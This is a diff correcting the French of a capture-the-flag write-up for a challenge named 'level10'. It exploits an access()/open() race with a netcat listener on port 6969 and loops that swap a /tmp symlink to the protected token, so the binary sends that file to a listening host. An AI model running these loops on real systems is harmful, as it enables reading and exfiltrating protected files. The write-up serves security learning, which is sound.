@@ -1,22 +1,22 @@
-ici on as aussi un binaire un un ficher `token`
+Ici, on a aussi un binaire un ficher `token`
 
-On test donc
+On test donc :
 ```bash
 ./level10 token
 ```
 
-Cela nous marque
+Cela nous marque :
 ```
 ./level10 file host
 	sends file to host if you have access to it
 ```
 
-On fat un `strings` sur le binaire et on vois qu'il envoie sur le port `6969`
+On fait un `strings` sur le binaire et on vois qu'il envoie quelque chose sur le port `6969`
 
 On met donc en place un server netcat qui ecoute sur ce port
 `nc -l 6969`
 
-En faisant ub `nm` on vois que le programe utilise `access` qui contient une faille
+En faisant, un `nm` on voit que le programme utilise `access` qui contient une faille.
 ```
        Warning:  Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates
        a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.   For
@@ -28,17 +28,17 @@ Il suffit de bruteforce
 ```bash
 while true ; do ./level10 token ip:6969 ; done
 ```
-je n'est pas acces a token
+Je n'est pas acces à token.
 
-je decide de le mettre dans le tmp token
+Je décide de le mettre dans le tmp token.
+
 ```bash
 while true ; do ./level10 /tmp/token ip:6969 ; done
 ```
 
-Toujours pas
+Toujours pas.
 
-Apres reflection
-Comme `level10` a des permission avec l'utilisateur `level10` mais pas `token` pour exploiter la faille de acces au mieux il faudrais swap les deux fichier avec un lien synblique par exemple dans `/tmp/`
+Après reflection, comme `level10` à des permissions avec l'utilisateur `level10` mais pas `token` pour exploiter la faille de `acces` au mieux, il faudrait swap les deux fichiers avec un lien symbolique par exemple dans `/tmp/`
 
 ```bash
 while true; do ln -fs ~/level10 /tmp/token; ln -fs ~/token /tmp/token; done
@@ -49,4 +49,4 @@ puis
 while true ; do ./level10 /tmp/token ip:6969 ; done
 ```
 
-On fait tourner les 3 programes et c'est bon !
+On fait tourner les 3 programmes et c'est bon !
